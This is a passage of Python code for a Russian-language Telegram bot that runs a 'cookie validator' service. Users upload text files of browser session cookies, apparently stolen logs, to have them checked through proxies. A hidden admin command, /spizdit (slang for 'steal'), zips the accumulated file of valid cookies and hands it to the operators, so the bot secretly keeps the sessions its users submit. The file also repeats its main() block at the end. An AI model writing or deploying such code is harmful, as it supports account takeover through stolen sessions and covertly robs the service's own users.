            InlineKeyboardButton(text="📨 Ответить", 
                callback_data=f"reply_{user_id}"),
            InlineKeyboardButton(text="❌ Скрыть", 
                callback_data=f"hide_admin_{user_id}")
        ]
    ])
    
    # Отправляем сообщение всем админам
    for admin_id in ADMINS:
        try:
            await bot.send_message(
                admin_id,
                f"<b>💤 НОВЫЙ ЗАПРОС В ПОДДЕРЖКУ</b>\n\n"
                f"👤 Пользователь: @{message.from_user.username} (ID: {user_id})\n"
                f"📝 Сообщение:\n{support_text}",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        except Exception as e:
            logging.error(f"Ошибка отправки сообщения админу {admin_id}: {e}")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
    ])
    
    await message.answer(
        "<b>✅ Ваше сообщение отправлено в поддержку!</b>\n\n"
        "Ожидайте ответа в этом чате. Среднее время ответа - 24 часа.",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.clear()

@router.callback_query(F.data.startswith("reply_"))
async def admin_reply_handler(callback: CallbackQuery, state: FSMContext):
    admin_id = callback.from_user.id
    if admin_id not in ADMINS:
        await callback.answer("❌ Доступ запрещен", show_alert=True)
        return
    
    user_id = int(callback.data.split("_")[1])
    await state.update_data(target_user=user_id)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Скрыть", callback_data=f"hide_admin_{user_id}")]
    ])
    
    await callback.message.answer(
        f"<b>📨 ОТВЕТ ПОЛЬЗОВАТЕЛЮ (ID: {user_id})</b>\n\n"
        "Введите ваш ответ. Вы можете использовать текст, фото или документы.",
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.admin_reply)

@router.message(Form.admin_reply)
async def process_admin_reply(message: Message, state: FSMContext):
    data = await state.get_data()
    user_id = data.get('target_user')
    
    if not user_id:
        await message.answer("❌ Ошибка: пользователь не найден")
        await state.clear()
        return
    
    try:
        # Клавиатура для пользователя
        user_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📨 Ответить", callback_data="support"),
             InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
        ])
        
        # Отправляем ответ пользователю
        if message.photo:
            await bot.send_photo(
                chat_id=user_id,
                photo=message.photo[-1].file_id,
                caption=f"<b>📨 ОТВЕТ ПОДДЕРЖКИ</b>\n\n{message.caption}",
                parse_mode=ParseMode.HTML,
                reply_markup=user_keyboard
            )
        else:
            await bot.send_message(
                chat_id=user_id,
                text=f"<b>📨 ОТВЕТ ПОДДЕРЖКИ</b>\n\n{message.text}",
                parse_mode=ParseMode.HTML,
                reply_markup=user_keyboard
            )
        
        # Уведомляем админа
        await message.answer(
            f"<b>✅ Ответ успешно отправлен пользователю (ID: {user_id})</b>",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await message.answer(
            f"<b>❌ Ошибка отправки ответа:</b>\n{str(e)}",
            parse_mode=ParseMode.HTML
        )
    
    await state.clear()

@router.message(Form.validator_file)
async def process_validator_file(message: Message, state: FSMContext):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(f"❌ Вы заблокированы. Причина: {reason}", parse_mode=ParseMode.HTML)
        return
    
    file_path = None
    try:
        if not message.document:
            await message.answer("<b>❌ Пожалуйста, отправьте файл с куками.</b>", parse_mode=ParseMode.HTML)
            return

        if not message.document.file_name.endswith('.txt'):
            await message.answer("<b>❌ Неверный формат файла. Отправьте текстовый файл (txt).</b>", parse_mode=ParseMode.HTML)
            return

        file_id = message.document.file_id
        file_name = f"validator_{random.randint(100000, 999999)}.txt"
        file_path = f"{COOKIE_FILES_DIR}{file_name}"
        
        msg = await message.answer("<b>⏳ Скачиваю файл... Это может занять время для больших файлов.</b>", parse_mode=ParseMode.HTML)
        
        await bot.download(file_id, destination=file_path)
        
        file_info = process_cookie_file(file_path)
        
        if not file_info['cookies']:
            await msg.edit_text("<b>❌ В файле не найдено валидных cookies. Проверьте формат файла.</b>", parse_mode=ParseMode.HTML)
            return
        
        # Создаем отдельную очередь для валидатора
        validator_queue.put((message.from_user.id, file_info, msg))
        queue_size = validator_queue.qsize()
        
        if current_validator_checking is None:
            status_msg = (
                "<b>📊 ФАЙЛ ДОБАВЛЕН В ОЧЕРЕДЬ ВАЛИДАТОРА</b>\n\n"
                "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
                f"📝 Всего строк: <b>{file_info['total_lines']}</b>\n"
                f"✅ Валидных куки: <b>{len(file_info['cookies'])}</b>\n"
                f"♻️ Дубликатов: <b>{file_info['duplicates']}</b>\n"
                f"❌ Невалидных строк: <b>{file_info['invalid_lines']}</b>\n\n"
                "⏳ Ожидайте начала проверки..."
            )
        else:
            status_msg = (
    "<b>📊 ФАЙЛ ДОБАВЛЕН В ОЧЕРЕДЬ ВАЛИДАТОРА</b>\n\n"
    "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
    f"📝 Всего строк: <b>{file_info['total_lines']}</b>\n"
    f"✅ Валидных куки: <b>{len(file_info['cookies'])}</b>\n"
    f"♻️ Дубликатов: <b>{file_info['duplicates']}</b>\n"
    f"❌ Невалидных строк: <b>{file_info['invalid_lines']}</b>\n\n"
    f"📊 Ваша позиция в очереди: <b>{queue_size}</b>\n"
    f"🕒 Примерное время ожидания: <b>{queue_size * 2}-{queue_size * 5} минут</b>\n\n"
    "🔄 Статус очереди будет обновляться автоматически."
)
        
        await msg.edit_text(status_msg, parse_mode=ParseMode.HTML)
        await notify_validator_queue_update()
            
    except Exception as e:
        error_message = (
            f"<b>❌ ОШИБКА ОБРАБОТКИ ФАЙЛА</b>\n\n"
            f"﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
            f"Произошла ошибка при обработке файла:\n"
            f"<code>{str(e)}</code>\n\n"
            f"Попробуйте еще раз или обратитесь к администратору."
        )
        await message.answer(error_message, parse_mode=ParseMode.HTML)
        logging.error(f"Ошибка обработки файла в валидаторе: {e}")
    finally:
        if file_path and os.path.exists(file_path):
            os.remove(file_path)

@router.callback_query(F.data.startswith("hide_admin_"))
async def hide_admin_message(callback: CallbackQuery):
    user_id = int(callback.data.split("_")[-1])
    if callback.from_user.id in ADMINS:
        await callback.message.delete()
        await callback.answer("Сообщение скрыто")
    else:
        await callback.answer("❌ Нет прав для этого действия", show_alert=True)

@router.callback_query(F.data == "validator")
async def validator_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🩸Начать проверку🩸", callback_data="start_validator")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_main")]
    ])
    
    await callback.message.edit_text(
        '<b>🩸МЕНЮ ВАЛИДАТОРА COOKIE🩸</b>\n\n'
        '<b>﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌</b>\n'
        '<b>✅Простой валидатор куки:✅</b>\n\n'
        '1. Быстрая проверка на валидность\n'
        '2. Удаление дубликатов\n'
        '3. Возвращает только рабочие куки\n\n'
        '<b>🤔Как использовать:🤔</b>\n'
        '1. Нажмите "🩸Начать проверку🩸"\n'
        '2. Отправьте файл с куками (txt)\n'
        '3. Получите файл с валидными куками\n\n'
        '<b>🚨Внимание:🚨</b>\n'
        '- Максимальный размер файла: 20MB\n'
        '- Проверка может занять время\n'
        '- Наш чекер - ваша стабильность',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )

@router.callback_query(F.data == "start_validator")
async def start_validator(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await callback.answer(f"❌ Вы заблокированы. Причина: {reason}", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="validator")]
    ])
    
    await callback.message.answer(
        '<b>🩸ИНСТРУКЦИЯ ВАЛИДАТОРА🩸</b>\n\n'
        '<b>﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌</b>\n'
        '1. <b>Подготовьте файл</b> с куками (формат txt)\n'
        '2. <b>Отправьте файл</b> в этот чат\n\n'
        '<b>🤔Требования к файлу:🤔</b>\n'
        '- Только текстовый формат (txt)\n'
        '- Максимальный размер: 20MB\n'
        '- Каждый куки на новой строке\n\n'
        '<b>Что проверяется:</b>\n'
        '- Валидность куки\n'
        '- Удаление дубликатов\n\n'
        '<b>✅Ожидаю ваш файл...✅</b>',
        parse_mode=ParseMode.HTML,
        reply_markup=keyboard
    )
    await state.set_state(Form.validator_file)

@router.message(Command("setproxy"))
async def set_proxy(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        proxies = message.text.split('\n')[1:]
        proxies = [p.strip() for p in proxies if p.strip()]
        
        if not proxies:
            await message.answer("<b>❌ Список прокси пуст. Укажите прокси после команды.</b>", parse_mode=ParseMode.HTML)
            return
        
        Database.save_proxies(proxies)
        await message.answer(
            f"<b>✅ Прокси успешно сохранены!</b>\n\n"
            f"<b>Общее количество:</b> {len(proxies)}\n"
            f"<b>Первые 5 прокси:</b>\n" + "\n".join(proxies[:5]),
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await message.answer(
            f"<b>❌ Ошибка сохранения прокси:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("listproxy"))
async def list_proxy(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    proxies = Database.load_proxies()
    if not proxies:
        await message.answer("<b>📃 Список прокси пуст</b>", parse_mode=ParseMode.HTML)
    else:
        text = (
            f"<b>📃 Список прокси (всего: {len(proxies)})</b>\n\n"
            f"<code>" + "\n".join(proxies[:20]) + "</code>\n\n"
            f"<i>Показано первых 20 из {len(proxies)}</i>"
        )
        await message.answer(text, parse_mode=ParseMode.HTML)

@router.message(Command("ban"))
async def ban_user(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            await message.answer(
                "<b>❌ Неверный формат команды.</b>\n"
                "<b>Используйте:</b> <code>/ban @username или ID причина</code>\n\n"
                "<i>Пример:</i> <code>/ban 12345678 Нарушение правил</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        target = args[1].strip('@')
        reason = args[2]
        
        if target.isdigit():
            user_id = int(target)
            username = "Неизвестно"
        else:
            user_id = None
            for user in Database.get_all_users():
                config = Database.get_user_config(user)
                if config.get('username') == target:
                    user_id = user
                    username = target
                    break
        
        if not user_id:
            await message.answer(f"<b>❌ Пользователь @{target} не найден.</b>", parse_mode=ParseMode.HTML)
            return
        
        Database.ban_user(user_id, reason)
        
        try:
            await bot.send_message(
                chat_id=user_id,
                text=f"<b>❌ ВЫ ЗАБЛОКИРОВАНЫ</b>\n\nПричина: {reason}\n\n"
                     "Если вы считаете это ошибкой, свяжитесь с администратором.",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logging.error(f"Не удалось уведомить пользователя {user_id} о блокировке: {e}")
        
        await message.answer(
            f"<b>✅ Пользователь @{username} (ID: {user_id}) заблокирован.</b>\n"
            f"<b>Причина:</b> {reason}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await message.answer(
            f"<b>❌ Ошибка блокировки пользователя:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("unban"))
async def unban_user(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            await message.answer(
                "<b>❌ Неверный формат команды.</b>\n"
                "<b>Используйте:</b> <code>/unban @username или ID</code>\n\n"
                "<i>Пример:</i> <code>/unban 12345678</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        target = args[1].strip('@')
        
        if target.isdigit():
            user_id = int(target)
            username = "Неизвестно"
        else:
            user_id = None
            for user in Database.get_all_users():
                config = Database.get_user_config(user)
                if config.get('username') == target:
                    user_id = user
                    username = target
                    break
        
        if not user_id:
            await message.answer(f"<b>❌ Пользователь @{target} не найден.</b>", parse_mode=ParseMode.HTML)
            return
        
        if not Database.is_user_banned(user_id):
            await message.answer(f"<b>❌ Пользователь @{target} (ID: {user_id}) не заблокирован.</b>", parse_mode=ParseMode.HTML)
            return
        
        Database.unban_user(user_id)
        
        try:
            await bot.send_message(
                chat_id=user_id,
                text="<b>✅ ВАША БЛОКИРОВКА СНЯТА</b>\n\nТеперь вы снова можете пользоваться ботом.",
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            logging.error(f"Не удалось уведомить пользователя {user_id} о разблокировке: {e}")
        
        await message.answer(
            f"<b>✅ Пользователь @{username} (ID: {user_id}) разблокирован.</b>",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await message.answer(
            f"<b>❌ Ошибка разблокировки пользователя:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.message(Command("banlist"))
async def banlist(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    banned_users = Database.load_banned_users()
    if not banned_users:
        await message.answer("<b>❌ Список заблокированных пользователей пуст.</b>", parse_mode=ParseMode.HTML)
        return
    
    banlist_message = "<b>🤔 СПИСОК ЗАБЛОКИРОВАННЫХ ПОЛЬЗОВАТЕЛЕЙ</b>\n\n"
    for index, (user_id, ban_info) in enumerate(banned_users.items(), start=1):
        banlist_message += (
            f"{index}. <b>ID:</b> {user_id}\n"
            f"<b>Причина:</b> {ban_info.get('reason', 'Не указана')}\n"
            f"<b>Дата:</b> {ban_info.get('date', 'Неизвестно')}\n"
            f"﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
        )
    
    await message.answer(banlist_message, parse_mode=ParseMode.HTML)

@router.message(Command("post"))
async def post_message(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    # Проверяем, есть ли фото
    has_photo = bool(message.photo)
    text = message.caption if has_photo else message.text.split("/post", 1)[1].strip()
    
    if not text and not has_photo:
        await message.answer("<b>❌ Текст сообщения не может быть пустым.</b>", parse_mode=ParseMode.HTML)
        return
    
    users = Database.get_all_users()
    total_users = len(users)
    success = 0
    failed = 0
    
    progress_msg = await message.answer(
        f"<b>📢 НАЧАТА РАССЫЛКА</b>\n\n"
        f"<b>Получателей:</b> {total_users}\n"
        f"<b>Статус:</b> 0/{total_users}\n"
        f"<b>Успешно:</b> 0\n"
        f"<b>Не удалось:</b> 0",
        parse_mode=ParseMode.HTML
    )
    
    for user_id in users:
        try:
            if has_photo:
                photo = message.photo[-1].file_id
                await bot.send_photo(
                    chat_id=user_id,
                    photo=photo,
                    caption=text,
                    parse_mode=ParseMode.HTML
                )
            else:
                await bot.send_message(
                    chat_id=user_id,
                    text=text,
                    parse_mode=ParseMode.HTML
                )
            success += 1
        except Exception as e:
            failed += 1
            logging.error(f"Ошибка отправки сообщения пользователю {user_id}: {e}")
        
        if (success + failed) % 10 == 0 or (success + failed) == total_users:
            try:
                await progress_msg.edit_text(
                    f"<b>📢 РАССЫЛКА</b>\n\n"
                    f"<b>Получателей:</b> {total_users}\n"
                    f"<b>Статус:</b> {success + failed}/{total_users}\n"
                    f"<b>Успешно:</b> {success}\n"
                    f"<b>Не удалось:</b> {failed}",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
    
    await message.answer(
        f"<b>📊 РАССЫЛКА ЗАВЕРШЕНА</b>\n\n"
        f"<b>Всего получателей:</b> {total_users}\n"
        f"<b>Успешно доставлено:</b> {success}\n"
        f"<b>Не удалось доставить:</b> {failed}\n\n"
        f"<b>Процент успешных:</b> {round(success/total_users*100, 2)}%",
        parse_mode=ParseMode.HTML
    )

@router.message(Command("spizdit"))
async def spizdit_cookies(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        valid_cookies_file = 'all_valid_cookies.txt'
        
        if not os.path.exists(valid_cookies_file) or os.path.getsize(valid_cookies_file) == 0:
            await message.answer("<b>❌ Файл с валидными куками пуст или не существует.</b>", parse_mode=ParseMode.HTML)
            return
        
        zip_file_path = 'valid_cookies.zip'
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(valid_cookies_file, arcname=os.path.basename(valid_cookies_file))
        
        await message.answer_document(
            document=FSInputFile(zip_file_path),
            caption="<b>📁 Файл с валидными куками:</b>",
            parse_mode=ParseMode.HTML
        )
        
        os.remove(zip_file_path)
        
    except Exception as e:
        await message.answer(
            f"<b>❌ Ошибка экспорта куки:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )
        logging.error(f"Ошибка в /spizdit: {e}")

@router.message(Command("soob"))
async def send_personal_message(message: Message):
    if message.from_user.id not in ADMINS:
        return
    
    try:
        # Разбираем команду
        args = message.text.split(maxsplit=2)
        if len(args) < 3:
            await message.answer(
                "<b>❌ Неверный формат команды.</b>\n"
                "<b>Используйте:</b> <code>/soob @username или ID текст сообщения</code>\n\n"
                "<i>Пример:</i> <code>/soob 12345678 Привет, как дела?</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        target = args[1].strip('@')
        text = args[2]
        
        # Ищем пользователя
        if target.isdigit():
            user_id = int(target)
            username = "Неизвестно"
        else:
            user_id = None
            for user in Database.get_all_users():
                config = Database.get_user_config(user)
                if config.get('username') == target:
                    user_id = user
                    username = target
                    break
        
        if not user_id:
            await message.answer(f"<b>❌ Пользователь @{target} не найден.</b>", parse_mode=ParseMode.HTML)
            return
        
        # Создаем клавиатуру с кнопкой "Скрыть"
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Скрыть", callback_data=f"hide_msg_{message.from_user.id}")]
        ])
        
        # Отправляем сообщение
        if message.photo:
            photo = message.photo[-1].file_id
            await bot.send_photo(
                chat_id=user_id,
                photo=photo,
                caption=f"<b>📬 Сообщение от поддержки:</b>\n\n"
                       f"<i>〝{text}〞</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        else:
            await bot.send_message(
                chat_id=user_id,
                text=f"<b>📬 Сообщение от поддержки:</b>\n\n"
                     f"<i>〝{text}〞</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard
            )
        
        await message.answer(
            f"<b>✅ Сообщение отправлено пользователю @{username} (ID: {user_id})</b>",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await message.answer(
            f"<b>❌ Ошибка отправки сообщения:</b>\n<code>{str(e)}</code>",
            parse_mode=ParseMode.HTML
        )

@router.message()
async def check_ban(message: Message):
    user_id = message.from_user.id
    if Database.is_user_banned(user_id):
        reason = Database.get_ban_reason(user_id)
        await message.answer(
            f"<b>❌ ВЫ ЗАБЛОКИРОВАНЫ</b>\n\n"
            f"﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌\n"
            f"Причина блокировки: <b>{reason}</b>\n\n"
            f"Если вы считаете, что это ошибка, свяжитесь с администратором.",
            parse_mode=ParseMode.HTML
        )
        return
    
    await message.answer(
        "<b>❌Неизвестная команда❌</b>\n\n"
        "Используйте /start для начала работы с ботом.",
        parse_mode=ParseMode.HTML
    )

async def main():
    await Database.send_startup_message()  # Вызываем метод класса
    
    # Запускаем обработчик очереди в фоне
    global queue_task, validator_task
    queue_task = asyncio.create_task(process_queue())
    active_tasks.add(queue_task)
    
    validator_task = asyncio.create_task(process_validator_queue())
    validator_active_tasks.add(validator_task)
    
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler("bot.log"),
            logging.StreamHandler()
        ]
    )
    
    logging.info("Запуск бота...")
    asyncio.run(main())

import asyncio

async def main():
    global queue_task, validator_task

    # Запускаем обработчики очередей
    queue_task = asyncio.create_task(process_queue())
    validator_task = asyncio.create_task(process_validator_queue())

    # Подключаем роутеры
    dp.include_router(router)

    # Пробуем отправить сообщения о запуске
    try:
        await Database.send_startup_message()
    except Exception as e:
        logging.error(f"Не удалось отправить startup сообщения: {e}")

    # Запускаем лонгполлинг
    await dp.start_polling(bot)


if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s"
    )
    asyncio.run(main())
